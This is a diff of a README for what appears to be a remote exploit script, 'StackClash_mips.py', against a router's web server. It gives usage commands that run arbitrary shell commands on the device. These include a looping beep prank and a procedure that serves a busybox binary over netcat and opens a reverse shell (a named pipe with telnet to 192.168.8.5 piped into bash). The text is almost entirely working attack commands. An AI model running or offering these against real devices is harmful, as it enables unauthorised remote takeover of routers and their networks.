@@ -65,7 +65,7 @@ $ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
 ### Super Mario sound
 Do not do it! ;-P
 ```
-$ ./StackClash_mips.py 192.168.8.1 80 www_6384 "while [ true ]; do /nova/bin/info ':beep frequency=660 length=100ms;:delay 150ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=510 length=100ms;:delay 100ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=770 length=100ms;:delay 550ms;:beep frequency=380 length=100ms;:delay 575ms;:beep frequency=510 length=100ms;:delay 450ms;:beep frequency=380 length=100ms;:delay 400ms;:beep frequency=320 length=100ms;:delay 500ms;:beep frequency=440 length=100ms;:delay 300ms;:beep frequency=480 length=80ms;:delay 330ms;:beep frequency=450 length=100ms;:delay 150ms;:beep frequency=430 length=100ms;:delay 300ms;:beep frequency=380 length=100ms;:delay 200ms;:beep frequency=660 length=80ms;:delay 200ms;:beep frequency=760 length=50ms;:delay 150ms;:beep frequency=860 length=100ms;:delay 300ms;:beep frequency=700 length=80ms;:delay 150ms;:beep frequency=760 length=50ms;:delay 350ms;:beep frequency=660 length=80ms;:delay 300ms;:beep frequency=520 length=80ms;:delay 150ms;:beep frequency=580 length=80ms;:delay 150ms;:beep frequency=480 length=80ms;:delay 500ms;'; done"
+$ ./StackClash_mips.py 192.168.8.1 80 www_binary "while [ true ]; do /nova/bin/info ':beep frequency=660 length=100ms;:delay 150ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=510 length=100ms;:delay 100ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=770 length=100ms;:delay 550ms;:beep frequency=380 length=100ms;:delay 575ms;:beep frequency=510 length=100ms;:delay 450ms;:beep frequency=380 length=100ms;:delay 400ms;:beep frequency=320 length=100ms;:delay 500ms;:beep frequency=440 length=100ms;:delay 300ms;:beep frequency=480 length=80ms;:delay 330ms;:beep frequency=450 length=100ms;:delay 150ms;:beep frequency=430 length=100ms;:delay 300ms;:beep frequency=380 length=100ms;:delay 200ms;:beep frequency=660 length=80ms;:delay 200ms;:beep frequency=760 length=50ms;:delay 150ms;:beep frequency=860 length=100ms;:delay 300ms;:beep frequency=700 length=80ms;:delay 150ms;:beep frequency=760 length=50ms;:delay 350ms;:beep frequency=660 length=80ms;:delay 300ms;:beep frequency=520 length=80ms;:delay 150ms;:beep frequency=580 length=80ms;:delay 150ms;:beep frequency=480 length=80ms;:delay 500ms;'; done"
 ```
 
 ### Upload binaries
@@ -73,11 +73,11 @@ To upload `busybox-mips` in `/ram/busybox`
 In a shell:
 ```
 $ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips  
-$ hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g" | nc -l -q 0 -p 1234
+$ { echo "echo Uploading..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g"; } | nc -l -q 0 -p 1234
 ```  
 In another shell (note that this is the reverse shell command):
 ```
-$ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
+$ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f"
 ```
 and wait until the connection automatically close.  
 (Once the file is uploaded, run again reverse shell (this time only listening with `nc -l -p 1234`) and you will find busybox inside `/ram/`)
